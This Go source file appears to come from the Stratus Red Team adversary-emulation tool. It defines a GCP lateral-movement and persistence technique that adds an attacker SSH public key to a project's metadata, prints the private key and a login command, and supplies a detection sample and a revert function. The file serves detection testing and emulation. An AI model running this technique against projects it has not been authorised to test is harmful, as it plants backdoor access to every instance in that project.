package gcp

import (
    "context"
    _ "embed"
    "fmt"
    "log"
    "google.golang.org/api/compute/v1"
    gcp_utils "github.com/datadog/stratus-red-team/v2/internal/utils/gcp"
    "github.com/datadog/stratus-red-team/v2/pkg/stratus"
    "github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const AttackerUsername = "stratus-skpm"

func init() {
    const CodeBlock = "```"
    const AttackTechniqueId = "gcp.lateral-movement.add-sshkey-project-metadata"

    stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
        ID:           AttackTechniqueId,
        FriendlyName: "Register SSH public key to project metadata",
        Description: `
Register a public key to the project's metadata to allow login and gain access to any instance in the project.

Warm-up: 

- Create a compute instance (Linux)

Detonation:

- Create RSA key-pair (private key and public key)
- Register public key to project's metadata.
- Print private key to stdout. 

Note that you need to save the private key for login.

Reference:
- https://cloud.google.com/sdk/gcloud/reference/compute/project-info/add-metadata
- https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-compute-privesc/gcp-add-custom-ssh-metadata.html
`,
        Detection: `
Registering SSH public key to the project's metadata is detected as 'compute.projects.setCommonInstanceMetadata' in Cloud Logging

Sample event (shortened for readability):

` + CodeBlock + `json
{
  "logName": "projects/my-project-id/logs/cloudaudit.googleapis.com%2Factivity",
  "protoPayload": {
    "authenticationInfo": {
      "principalEmail": "username@service.com",
    },
    "serviceName": "compute.googleapis.com",
    "methodName": "v1.compute.projects.setCommonInstanceMetadata",
    "resourceName": "projects/my-project-id/zones/my-zone-id/instances/my-instance-id",
  },
  "resource": {
    "type": "gce_project"
  },
  "severity": "NOTICE"
}
` + CodeBlock + `
`,
        Platform:                   stratus.GCP,
        IsIdempotent:               true,
        MitreAttackTactics:         []mitreattack.Tactic{ 
            mitreattack.LateralMovement, 
            mitreattack.Persistence },
        PrerequisitesTerraformCode: tf,
        Detonate:                   detonate,
        Revert:                     revert,
    })
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
    gcp := providers.GCP()
    ctx := context.Background()

    projectId    := gcp.GetProjectId()
    instanceIp   := params["instance_ip"]

    // create compute service
    service, err := compute.NewService(ctx)
    if err != nil {
        return fmt.Errorf("Failed to create compute service: %v", err)
    }

    log.Println("Generating public/private key pair for user")

    // create RSA public/key pair
    key, err := gcp_utils.CreateSSHKeyPair()
    if err != nil {
        return fmt.Errorf("Failed to create RSA key-pair: %v", err)
    }

    log.Println("Registering public key to project's metadata")
    
    // get project information
    project, err := service.Projects.Get(projectId).Do()
    if err != nil {
        return fmt.Errorf("Failed to get project information: %v", err)
    }

    md := project.CommonInstanceMetadata
    entry := fmt.Sprintf("%s:%s", AttackerUsername, string(key.PublicKey))

    gcp_utils.InsertToMetadata(md, "ssh-keys", entry)
    if _, err := service.Projects.SetCommonInstanceMetadata(projectId, md).Do(); err != nil {
        return fmt.Errorf("Failed to update project metadata: %v", err)
    }

    log.Printf("Save this Private Key as 'account.priv':\n\n%s\n", key.PrivateKey)
    log.Println("Attacker can now login to the instance using the following command:")
    log.Printf("ssh -i account.priv %s@%s", AttackerUsername, instanceIp)

    return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
    gcp := providers.GCP()
    ctx := context.Background()

    projectId := gcp.GetProjectId()
    
    // create compute service
    service, err := compute.NewService(ctx)
    if err != nil {
        return fmt.Errorf("Failed to create compute service: %v", err)
    }
    
    // get project information
    project, err := service.Projects.Get(projectId).Do()
    if err != nil {
        return fmt.Errorf("Failed to get project information: %v", err)
    }

    md := project.CommonInstanceMetadata
    gcp_utils.RemoveSshKeyFromMetadata(md, AttackerUsername)
    if _, err := service.Projects.SetCommonInstanceMetadata(projectId, md).Do(); err != nil {
        return fmt.Errorf("Failed to update project metadata: %v", err)
    }

    return nil
}